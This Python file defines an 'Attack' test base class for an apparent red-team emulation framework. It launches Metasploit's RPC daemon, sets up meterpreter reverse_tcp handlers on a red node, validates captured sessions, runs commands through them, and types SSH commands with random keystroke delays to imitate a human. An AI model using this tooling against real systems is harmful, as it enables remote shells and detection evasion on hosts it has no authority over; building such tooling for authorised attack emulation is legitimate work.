import atexit
import os
import logging
import msgpack  # type: ignore
import paramiko
import psutil
import random
import signal
import socket
import subprocess
import sys
import time
import unittest

from functools import wraps
from pymetasploit3.msfrpc import MeterpreterSession, MsfRpcClient  # type: ignore
from types import FrameType
from typing import Any, Callable, List, Optional, ParamSpec, TypeVar, Union

from controller.settings import MSF_RPC_PASSWORD, LOG_LEVEL, RED_NODE_IP_ADDRESS

T = TypeVar("T")
P = ParamSpec("P")


def wait_for_port(host: str, port: int, timeout: int = 30) -> bool:
    start = time.time()
    while time.time() - start < timeout:
        try:
            with socket.create_connection((host, port), timeout=2):
                return True
        except OSError:
            time.sleep(1)
    return False


class Attack(unittest.TestCase):
    KEYSTROKE_DELAY_MIN = 0.1
    KEYSTROKE_DELAY_MAX = 0.3
    MSF_STARTUP_TIMEOUT = 60
    MSF_STARTUP_DELAY = 8  # Reduced since we're disabling database
    MSF_SHUTDOWN_TIMEOUT = 5

    MSFRPCD_PATH = os.getenv("MSFRPCD_PATH")
    MSF_HOST = "127.0.0.1"
    MSF_PORT = 55553
    MSF_USERNAME = "msf"
    msfrpcd_process = None

    COMMAND_TIMEOUT = 30

    msf_client: MsfRpcClient

    @classmethod
    def setUpClass(cls) -> None:
        logging.basicConfig(level=LOG_LEVEL)

        if not cls.MSFRPCD_PATH:
            raise RuntimeError("MSFRPCD_PATH environment variable not set")

        # Check for and cleanup existing msfrpcd processes
        existing_processes = []
        for proc in psutil.process_iter(["pid", "name", "cmdline"]):
            try:
                if "msfrpcd" in proc.info["name"] or (
                    proc.info["cmdline"] and "msfrpcd" in proc.info["cmdline"][0]
                ):
                    existing_processes.append(proc.info["pid"])
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                continue

        if existing_processes:
            logging.warning(
                f"Found existing msfrpcd processes: {existing_processes}. Cleaning up..."
            )
            kill_msfrpcd()
            time.sleep(2)  # Give processes time to terminate

        def try_bind_port() -> bool:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            try:
                sock.bind(("127.0.0.1", cls.MSF_PORT))
                sock.close()
                return True
            except socket.error:
                sock.close()
                return False

        # Check if port is in use
        if not try_bind_port():
            logging.warning(
                f"Port {cls.MSF_PORT} is in use. Attempting to kill existing processes..."
            )
            kill_msfrpcd()
            time.sleep(2)
            if not try_bind_port():
                raise RuntimeError(
                    f"Port {cls.MSF_PORT} is still in use after cleanup attempt. Please check manually."
                )

        try:
            cmd = [
                str(cls.MSFRPCD_PATH),
                "-a",
                "127.0.0.1",
                "-P",
                str(MSF_RPC_PASSWORD),
                str(MSF_RPC_PASSWORD),
                "-S",
                "-U",
                str(cls.MSF_USERNAME),
                "-p",
                str(cls.MSF_PORT),
                "-n",  # Disable database - faster startup and fewer auth issues
            ]

            logging.info(f"Executing command: {' '.join(cmd)}")

            try:
                # Run process non-blocking with output capture for debugging
                process = subprocess.Popen(
                    cmd,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    universal_newlines=True,
                )
                if not wait_for_port("127.0.0.1", 55553, timeout=60):
                    # Check process output if port binding failed
                    stdout, stderr = process.communicate(timeout=2)
                    logging.error(f"msfrpcd stdout: {stdout}")
                    logging.error(f"msfrpcd stderr: {stderr}")
                    raise RuntimeError("msfrpcd did not start listening on port 55553")

                logging.info("msfrpcd started successfully")
                cls.msfrpcd_process = process

            except Exception as e:
                logging.error(f"Failed to start msfrpcd: {str(e)}")
                raise

            # Additional delay after connection verification
            time.sleep(cls.MSF_STARTUP_DELAY)

            # Connect to msfrpcd

            # Try to establish MsfRpcClient connection
            try:
                logging.info("Attempting to connect to msfrpcd via MsfRpcClient...")
                cls.msf_client = MsfRpcClient(
                    password=MSF_RPC_PASSWORD,
                    server=cls.MSF_HOST,
                    port=cls.MSF_PORT,
                    ssl=False,
                )
                logging.info("Successfully connected to msfrpcd via MsfRpcClient")
            except Exception as e:
                logging.error(
                    f"Failed to connect to msfrpcd via MsfRpcClient: {str(e)}"
                )
                cls.msfrpcd_process.kill()
                raise RuntimeError(
                    "Failed to connect to msfrpcd after multiple attempts"
                )
        except Exception as e:
            raise e

    @classmethod
    def tearDownClass(cls) -> None:
        """Clean up after all tests in this class."""
        if cls.msfrpcd_process:
            try:
                # Properly close file descriptors before terminating
                if cls.msfrpcd_process.stdout:
                    cls.msfrpcd_process.stdout.close()
                if cls.msfrpcd_process.stderr:
                    cls.msfrpcd_process.stderr.close()
                if cls.msfrpcd_process.stdin:
                    cls.msfrpcd_process.stdin.close()

                cls.msfrpcd_process.terminate()
                cls.msfrpcd_process.wait()
            except Exception as e:
                logging.warning(f"Error during msfrpcd process cleanup: {e}")
            finally:
                cls.msfrpcd_process = None

    @staticmethod
    def random_delay(
        min_ms: int, max_ms: int
    ) -> Callable[[Callable[..., T]], Callable[..., T]]:
        """Decorator to introduce a random delay before executing a function."""

        def decorator(func: Callable[..., T]) -> Callable[..., T]:
            def wrapper(*args: Any, **kwargs: Any) -> T:
                delay = random.uniform(min_ms / 1000.0, max_ms / 1000.0)
                time.sleep(delay)
                return func(*args, **kwargs)

            return wrapper

        return decorator

    @staticmethod
    def retry_on_failure(
        max_retries: int = 3, delay: float = 1.0
    ) -> Callable[[Callable[P, T]], Callable[P, T]]:
        def decorator(func: Callable[P, T]) -> Callable[P, T]:
            @wraps(func)
            def wrapper(*args: P.args, **kwargs: P.kwargs) -> T:
                last_exception = None
                for attempt in range(max_retries):
                    try:
                        return func(*args, **kwargs)
                    except Exception as e:
                        last_exception = e
                        logging.warning(f"Attempt {attempt + 1} failed: {str(e)}")
                        if attempt < max_retries - 1:
                            time.sleep(delay)
                if last_exception:
                    raise last_exception
                else:
                    raise Exception("Retry failed")

            return wrapper

        return decorator

    @staticmethod
    def check_port_usage(port: int) -> psutil.Process | None:
        """Check what process is using the specified port."""
        for conn in psutil.net_connections(kind="inet"):
            if conn.laddr and len(conn.laddr) >= 2 and conn.laddr[1] == port:
                try:
                    process = psutil.Process(conn.pid)
                    logging.warning(
                        f"Port {port} is being used by process: {process.name()} (PID: {conn.pid})"
                    )
                    return process
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    logging.warning(
                        f"Port {port} is in use but cannot access process info"
                    )
        return None

    def get_payload_module_path(self, platform: str) -> str:
        """Get the appropriate payload module path based on platform."""
        if "/" in platform:
            os_name, arch = platform.split("/")
        else:
            # Handle cases where only OS is specified
            if platform.lower() == "windows":
                os_name, arch = "windows", "x64"
            else:
                os_name, arch = "linux", "x64"

        if os_name.lower() == "linux":
            if arch.lower() in ["arm64", "aarch64"]:
                return "linux/aarch64/meterpreter/reverse_tcp"
            elif arch.lower() in ["armle", "arm"]:
                return "linux/armle/meterpreter/reverse_tcp"
            elif arch.lower() in ["armbe"]:
                return "linux/armbe/meterpreter/reverse_tcp"
            elif arch.lower() == "x64":
                return "linux/x64/meterpreter/reverse_tcp"
            elif arch.lower() == "x86":
                return "linux/x86/meterpreter/reverse_tcp"
            else:
                raise ValueError(f"Unsupported architecture for Linux: {arch}")
        elif os_name.lower() == "windows":
            if arch.lower() == "x64":
                return "windows/x64/meterpreter/reverse_tcp"
            else:
                return "windows/meterpreter/reverse_tcp"
        else:
            raise ValueError(f"Unsupported OS: {os_name}")

    def start_listener(self, target_platform: str) -> List[int]:
        """Start a Metasploit listener for the reverse shell."""
        # Get the same module path used for generating the payload
        module_path = self.get_payload_module_path(target_platform)
        logging.info(f"Setting up handler for payload: {module_path}")

        # Configure and start the handler
        exploit = self.msf_client.modules.use("exploit", "multi/handler")
        exploit.runoptions["payload"] = module_path
        exploit.runoptions["lhost"] = RED_NODE_IP_ADDRESS
        exploit.runoptions["lport"] = 4444

        sessions_before = [int(x) for x in self.msf_client.sessions.list.keys()]

        # Start the handler as a background job to keep it listening
        job_result = exploit.execute(payload=module_path)
        logging.info(f"Started handler job: {job_result}")

        # Give the handler time to start listening
        time.sleep(3)

        # Verify the handler is listening
        import socket

        try:
            with socket.create_connection((RED_NODE_IP_ADDRESS, 4444), timeout=5):
                logging.info("Handler is listening on port 4444")
        except (socket.error, socket.timeout):
            logging.warning("Handler may not be listening properly on port 4444")

        return sessions_before

    def wait_for_new_meterpreter_session(
        self, existing_sessions: List[int], timeout: int = 90
    ) -> int:
        """Wait for and verify a new Meterpreter session with enhanced monitoring."""
        start_time = time.time()
        session_check_interval = 2
        stabilization_time = 15  # Increased stabilization time

        logging.info(f"Waiting for new MSF session (timeout: {timeout}s)")

        while time.time() - start_time < timeout:
            try:
                # Get current sessions
                sessions = self.msf_client.sessions.list
                current_sessions = {int(k): v for k, v in sessions.items()}

                # Find new sessions
                new_sessions = set(current_sessions.keys()) - set(existing_sessions)

                if new_sessions:
                    session_id = min(new_sessions)
                    session_info = current_sessions.get(session_id, {})

                    logging.info(f"New session detected: {session_id}")
                    logging.info(f"Session info: {session_info}")

                    # Wait for session to stabilize with progress logging
                    logging.info(
                        f"Waiting {stabilization_time} seconds for session {session_id} to stabilize..."
                    )
                    for i in range(stabilization_time):
                        time.sleep(1)
                        if i % 5 == 0:  # Log progress every 5 seconds
                            logging.info(
                                f"Stabilization progress: {i+1}/{stabilization_time} seconds"
                            )

                        # Check if session still exists during stabilization
                        try:
                            current_sessions_check = self.msf_client.sessions.list
                            if str(session_id) not in current_sessions_check:
                                logging.warning(
                                    f"Session {session_id} disappeared during stabilization at {i+1}s"
                                )
                                break
                        except Exception as e:
                            logging.warning(
                                f"Error checking session during stabilization: {e}"
                            )

                    # Verify session with enhanced retries
                    logging.info(f"Validating session {session_id}...")
                    if self.validate_msf_session(session_id, retries=5):
                        # Final double-check session still exists
                        try:
                            final_sessions = self.msf_client.sessions.list
                            if str(session_id) in final_sessions:
                                logging.info(
                                    f"Session {session_id} successfully established and validated"
                                )
                                return session_id
                            else:
                                logging.warning(
                                    f"Session {session_id} disappeared after validation"
                                )
                        except Exception as e:
                            logging.warning(f"Error in final session check: {e}")
                    else:
                        logging.warning(f"Session {session_id} failed validation")

            except Exception as e:
                logging.warning(f"Error in session check loop: {e}")

            # Log progress periodically
            elapsed = time.time() - start_time
            if int(elapsed) % 10 == 0:  # Every 10 seconds
                logging.info(
                    f"Still waiting for stable session... ({elapsed:.0f}s/{timeout}s)"
                )

            time.sleep(session_check_interval)

        raise TimeoutError(f"No stable session established within {timeout} seconds")

    def start_ssh_session(
        self,
        host: str,
        username: str,
        password: Optional[str] = None,
        ssh_keyfile: Optional[str] = None,
    ) -> None:
        self.ssh_client = paramiko.SSHClient()
        self.ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())  # nosec

        if password:
            self.ssh_client.connect(
                hostname=host, port=22, username=username, password=password
            )
        elif ssh_keyfile:
            self.ssh_client.connect(
                hostname=host, port=22, username=username, key_filename=ssh_keyfile
            )
        else:
            self.ssh_client.connect(hostname=host, port=22, username=username)

    def validate_ssh_session(self, client: paramiko.SSHClient) -> bool:
        try:
            _, stdout, _ = client.exec_command("echo $?")  # nosec
            output = stdout.read().decode().strip()
            return output.isdigit()
        except Exception:
            return False

    @random_delay(25, 125)
    def send_ssh_command_with_random_delays(self, command: str) -> str:
        """Send a command with random inter-keystroke delays using Paramiko SSHClient."""
        channel = None
        try:
            # Open a new interactive shell channel
            channel = self.ssh_client.invoke_shell()
            channel.settimeout(self.COMMAND_TIMEOUT)

            # Clear initial banner
            time.sleep(1)
            while channel.recv_ready():
                channel.recv(1024)

            # Send the command character by character with delays
            for char in command:
                channel.send(char.encode("utf-8"))
                time.sleep(
                    random.uniform(self.KEYSTROKE_DELAY_MIN, self.KEYSTROKE_DELAY_MAX)
                )
            channel.send(b"\n")  # Send newline to execute the command

            # Wait briefly for command to start executing
            time.sleep(1)

            # Clear the command echo
            while channel.recv_ready():
                channel.recv(1024)

            # Read command output
            output = ""
            max_idle_time = 2  # Time to wait after last data received
            idle_start = time.time()

            while True:
                if channel.recv_ready():
                    received = channel.recv(1024).decode("utf-8", errors="replace")
                    output += received
                    idle_start = time.time()  # Reset idle timer after receiving data
                else:
                    if time.time() - idle_start > max_idle_time:
                        break
                    time.sleep(0.1)

            # Remove any remaining prompt characters
            output_list = output.split("\n")
            if output_list:
                output_list = output_list[:-1]  # Remove the last line (prompt)
            return "\n".join(output_list).strip()

        except Exception as e:
            raise RuntimeError(f"Error executing command '{command}': {str(e)}")
        finally:
            if channel:
                channel.close()

    def validate_msf_session(
        self, session_id: Union[int, MeterpreterSession], retries: int = 3
    ) -> bool:
        """
        Validate that the meterpreter session is still alive and responsive.
        """
        for attempt in range(retries):
            try:
                # Get session object
                if isinstance(session_id, int):
                    session_key = str(session_id)
                    session = self.msf_client.sessions.session(session_key)
                else:
                    session = session_id
                    session_key = str(session.sid)

                # Verify session exists
                sessions_list = self.msf_client.sessions.list
                if session_key not in sessions_list:
                    logging.warning(f"Session {session_key} not found")
                    continue

                # Try to get session info
                try:
                    result = session.run_with_output("getpid")
                    if not result:
                        logging.warning("No response to getpid command")
                        continue

                    # Verify sysinfo works
                    sysinfo = self.get_sysinfo(session)
                    if not sysinfo:
                        logging.warning("Could not get system info")
                        continue

                    logging.info(
                        f"Session {session_key} verified (attempt {attempt + 1})"
                    )
                    return True

                except Exception as e:
                    logging.error(f"Error checking session: {e}")
                    continue

            except Exception as e:
                logging.warning(
                    f"Session verification failed (attempt {attempt + 1}): {str(e)}"
                )

            time.sleep(2)

        logging.warning("MSF session verification failed")
        return False

    @random_delay(25, 125)
    def send_msf_shell_command(self, command: str, session: MeterpreterSession) -> str:
        """
        Send a shell command to Meterpreter session using msfrpc.
        """
        try:
            # Clear any pending output
            session.read()

            # Send the command with a unique marker
            marker = f"COMMAND_COMPLETE_{os.urandom(4).hex()}"
            full_command = f'{command}; echo "{marker}"\n'
            session.write(full_command)

            # Read output until we see our marker
            output = ""
            start_time = time.time()
            while time.time() - start_time < 30:  # 30 second timeout
                chunk = session.read()
                if chunk:
                    output += chunk
                    if marker in output:
                        # Remove the marker and command echo from output
                        output = output.split(marker)[0]
                        output = "\n".join(
                            output.split("\n")
                        )  # Remove first line (command echo)
                        break
                time.sleep(0.1)

            return output.strip()

        except Exception as e:
            logging.error(f"Error during command execution: {e}")
            # Try to exit shell mode in case of error
            try:
                session.write("exit\n")
                time.sleep(1)
                session.read()
            except:
                pass
            raise

    @random_delay(25, 125)
    def send_msf_command(self, command: str, session: MeterpreterSession) -> str:
        """
        Send a command to Meterpreter session with random delays using msfrpc.
        """
        try:
            # Send command and get output directly
            output = session.run_with_output(command)
            if not output:
                return ""

            # Check for error indicator6s
            if "[-]" in output or "[!]" in output:
                raise RuntimeError(f"Command failed: {output}")

            return str(output.strip())

        except Exception as e:
            raise RuntimeError(f"Error executing command '{command}': {str(e)}")

    def get_job_output(self, job_id: int) -> str:
        while True:
            jobs = self.msf_client.jobs.list
            if job_id not in jobs:
                # Job has finished
                break
            time.sleep(1)

        # Retrieve the output
        output = self.msf_client.consoles.console().read()
        return str(output)

    def get_sysinfo(self, session: MeterpreterSession) -> dict[str, str]:
        """
        Get system information from a meterpreter session using msfrpc methods.
        """
        try:
            # Use direct RPC call to get sysinfo
            result = session.run_with_output("sysinfo")
            if result:
                # Parse the sysinfo output into a dictionary
                sysinfo = {}
                for line in result.splitlines():
                    if ":" in line:
                        key, value = line.split(":", 1)
                        sysinfo[key.strip()] = value.strip()
                return sysinfo
            return {}

        except Exception as e:
            logging.error(f"Error getting system info: {e}")
            return {}


def kill_msfrpcd() -> None:
    """Kill any running msfrpcd processes"""
    try:
        # Find and kill msfrpcd processes
        for proc in psutil.process_iter(["pid", "name", "cmdline"]):
            try:
                if "msfrpcd" in proc.info["name"] or (
                    proc.info["cmdline"] and "msfrpcd" in proc.info["cmdline"][0]
                ):
                    proc.send_signal(signal.SIGKILL)
                    logging.info(f"Killed msfrpcd process {proc.info['pid']}")
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                continue
    except Exception as e:
        logging.error(f"Error during msfrpcd cleanup: {e}")


def signal_handler(signum: int, _: Optional[FrameType]) -> None:
    """Handle interrupt signals"""
    logging.info("Received interrupt signal, cleaning up...")
    kill_msfrpcd()
    sys.exit(1)


# Register the cleanup function
atexit.register(kill_msfrpcd)

# Register signal handlers
signal.signal(signal.SIGINT, signal_handler)
signal.signal(signal.SIGTERM, signal_handler)
